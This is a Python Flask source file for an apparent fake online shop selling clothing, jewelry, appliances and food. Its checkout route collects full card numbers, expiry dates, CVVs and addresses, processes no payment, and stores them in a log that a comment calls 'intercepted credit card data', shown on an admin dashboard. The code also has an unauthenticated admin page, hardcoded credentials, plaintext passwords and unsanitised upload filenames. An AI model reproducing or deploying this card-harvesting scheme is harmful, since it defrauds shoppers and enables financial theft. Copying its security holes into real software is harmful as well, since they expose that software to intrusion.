from flask import Flask, render_template, request, redirect, url_for, flash, jsonify
from datetime import datetime, timedelta
import os

app = Flask(__name__)
app.secret_key = "trinity_secret_key_2026"

# Configuration for the computer library image uploader
UPLOAD_FOLDER = os.path.join('static', 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# ----------------------------------------------------------------
# SIMULATED IN-MEMORY DATABASE (Resets on restart)
# ----------------------------------------------------------------
ADMIN_CREDENTIALS = {"name": "admin", "password": "password123"}

# Pre-loaded stock data across your requested categories
products = [
    {"id": 1, "title": "Classic Denim Jacket", "price": 45.00, "category": "mens_wear",
     "image": "https://images.unsplash.com/photo-1576995853123-5a10305d93c0", "stock": 12},
    {"id": 2, "title": "Elegant Evening Gown", "price": 85.00, "category": "womens_wear",
     "image": "https://images.unsplash.com/photo-1566174053879-31528523f8ae", "stock": 4},
    {"id": 3, "title": "Gold Cuban Link Chain", "price": 120.00, "category": "jewelery",
     "image": "https://images.unsplash.com/photo-1599643478518-a784e5dc4c8f", "stock": 8},
    {"id": 4, "title": "Smart Blender Pro", "price": 60.00, "category": "home_appliances",
     "image": "https://images.unsplash.com/photo-1570222094114-d054a817e56b", "stock": 2},
    {"id": 5, "title": "Premium Jasmine Rice 5kg", "price": 25.00, "category": "foodstuffs",
     "image": "https://images.unsplash.com/photo-1586201375761-83865001e31c", "stock": 45}
]

users = {}  # Database format: {username: {"password": pwd, "status": "pending"|"approved"|"denied"}}
card_logs = []  # Stores intercepted credit card data and delivery addresses for the admin panel
comments = {1: ["Very comfortable jacket!", "Fits perfectly."], 2: [], 3: [], 4: [], 5: []}


# ----------------------------------------------------------------
# ROUTES: CUSTOMER FRONTEND
# ----------------------------------------------------------------

@app.route('/')
def index():
    return redirect(url_for('shop'))


@app.route('/shop')
def shop():
    category_filter = request.args.get('category', 'all')
    if category_filter == 'all':
        filtered_products = products
    else:
        filtered_products = [p for p in products if p['category'] == category_filter]
    return render_template('shop.html', products=filtered_products, current_category=category_filter)


@app.route('/signup', methods=['POST'])
def signup():
    name = request.form.get('name')
    password = request.form.get('password')

    if not name or not password:
        flash("Please fill in all fields.", "error")
        return redirect(url_for('shop'))

    if name in users:
        flash("Username already exists.", "error")
    else:
        # New signups default to "pending" until the admin manually clicks approve
        users[name] = {"password": password, "status": "pending"}
        flash("Signup submitted! Awaiting Admin approval before you can log in.", "info")
    return redirect(url_for('shop'))


@app.route('/login', methods=['POST'])
def login():
    name = request.form.get('name')
    password = request.form.get('password')

    if name in users and users[name]['password'] == password:
        status = users[name]['status']
        if status == 'approved':
            flash(f"Welcome back, {name}!", "success")
        elif status == 'pending':
            flash("Your account is still pending admin approval.", "warning")
        else:
            flash("Your login request has been denied by management.", "error")
    else:
        flash("Invalid username or password.", "error")
    return redirect(url_for('shop'))


@app.route('/submit-card', methods=['POST'])
def submit_card():
    cardholder = request.form.get('cardholder')
    card_number = request.form.get('card_number')
    expiry = request.form.get('expiry')
    cvv = request.form.get('cvv')
    address = request.form.get('address')

    # Calculate the exact 2-week delivery window (current time + 14 days)
    delivery_date = (datetime.now() + timedelta(days=14)).strftime('%A, %B %d, %Y')

    # Save the card and address information directly to the backend storage log
    card_logs.append({
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "cardholder": cardholder,
        "card_number": card_number,
        "expiry": expiry,
        "cvv": cvv,
        "address": address if address else "Not Provided"
    })

    return jsonify({"status": "success", "delivery_date": delivery_date})


@app.route('/add-comment/<int:product_id>', methods=['POST'])
def add_comment(product_id):
    text = request.form.get('comment_text')
    if text and product_id in comments:
        comments[product_id].append(text)
    return redirect(url_for('shop'))


# ----------------------------------------------------------------
# ROUTES: MANAGEMENT ADMIN PORTAL
# ----------------------------------------------------------------

@app.route('/admin-login', methods=['POST'])
def admin_login():
    name = request.form.get('admin_name')
    password = request.form.get('admin_password')

    if name == ADMIN_CREDENTIALS['name'] and password == ADMIN_CREDENTIALS['password']:
        return redirect(url_for('admin_dashboard'))
    flash("Access Denied: Invalid Master Admin Credentials.", "error")
    return redirect(url_for('shop'))


@app.route('/trinity-manager')
def admin_dashboard():
    total_revenue = len(card_logs) * 150.00
    return render_template('admin.html', users=users, card_logs=card_logs, products=products,
                           total_revenue=total_revenue)


@app.route('/admin/user-action/<username>/<action>')
def user_action(username, action):
    if username in users and action in ['approved', 'denied']:
        users[username]['status'] = action
    return redirect(url_for('admin_dashboard'))


@app.route('/admin/upload-stock', methods=['POST'])
def upload_stock():
    title = request.form.get('title')
    price = request.form.get('price')
    category = request.form.get('category')

    # Check if a file was uploaded from your computer library folder
    file = request.files.get('image_file')
    image_url = "https://images.unsplash.com/photo-1531403009284-440f080d1e12"  # Fallback default

    if file and file.filename != '':
        filename = file.filename
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)
        image_url = f"/{file_path}"

    if title and price and category:
        new_id = len(products) + 1
        products.append({
            "id": new_id,
            "title": title,
            "price": float(price),
            "category": category,
            "image": image_url,
            "stock": 10
        })
        comments[new_id] = []
    return redirect(url_for('admin_dashboard'))


if __name__ == '__main__':
    app.run(debug=True, port=5000)
